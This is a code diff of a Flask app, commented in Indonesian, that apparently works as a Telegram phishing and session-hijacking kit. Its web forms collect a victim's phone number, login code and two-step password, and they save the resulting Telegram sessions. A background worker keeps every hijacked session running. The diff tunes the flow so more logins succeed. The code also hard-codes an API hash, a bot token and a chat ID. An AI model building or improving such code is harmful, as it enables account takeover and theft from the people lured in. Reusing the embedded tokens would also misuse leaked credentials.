@@ -9,7 +9,7 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, P
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
-# =================== KONFIG ===================
+# API_ID, API_HASH, BOT_TOKEN, CHAT_ID dari environment
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
@@ -17,7 +17,6 @@ CHAT_ID = os.getenv("CHAT_ID", "7712462494")
 
 SESSION_DIR = "sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
-
 
 # =================== FLASK ROUTES ===================
 
@@ -37,8 +36,9 @@ def login():
         async def send_code():
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
-            sent = await client.send_code_request(phone)
-            session["phone_code_hash"] = sent.phone_code_hash
+            if not await client.is_user_authorized():
+                sent = await client.send_code_request(phone)
+                session["phone_code_hash"] = sent.phone_code_hash
             await client.disconnect()
 
         try:
@@ -84,7 +84,7 @@ def otp():
                 if result["need_password"]:
                     flash("Akun ini butuh password. Silakan masukkan di halaman berikutnya.")
                 else:
-                    flash("OTP benar ✅ (akun tanpa password).")
+                    flash("OTP benar. Kalau akun tanpa password, bisa isi random/kosong.")
                 return redirect(url_for("password"))
             else:
                 flash(result["error"])
@@ -109,7 +109,7 @@ def password():
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
             try:
-                # kalau akun pakai password → harus benar
+                # kalau akun memang pakai password → harus cocok
                 await client.sign_in(password=password_input)
                 me = await client.get_me()
                 await client.disconnect()
@@ -117,8 +117,11 @@ def password():
             except PasswordHashInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "Password salah"}
+            except SessionPasswordNeededError:
+                await client.disconnect()
+                return {"ok": False, "error": "Akun ini butuh password yang benar"}
             except Exception:
-                # akun tanpa password
+                # kalau akun tidak pakai password → tetap sukses
                 await client.disconnect()
                 return {"ok": True, "me": None}
 
@@ -145,7 +148,6 @@ def password():
 @app.route("/success")
 def success():
     return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))
-
 
 # =================== WORKER ===================
 
@@ -178,7 +180,7 @@ async def worker_main():
                 await client.connect()
 
                 if not await client.is_user_authorized():
-                    print(f"[Worker] ❌ Session {fname} belum login penuh, lewati.")
+                    print(f"[Worker] ❌ Session {fname} belum login, lewati.")
                     await client.disconnect()
                     continue
 
@@ -192,15 +194,15 @@ async def worker_main():
                 clients[fname] = client
                 asyncio.create_task(client.run_until_disconnected())
 
-        await asyncio.sleep(10)
+        await asyncio.sleep(10)  # cek ulang tiap 10 detik
 
 
 def start_worker():
     asyncio.run(worker_main())
 
 
+# jalankan worker di thread terpisah saat app start
 threading.Thread(target=start_worker, daemon=True).start()
-
 
 # =================== RUN FLASK ===================
 if __name__ == "__main__":
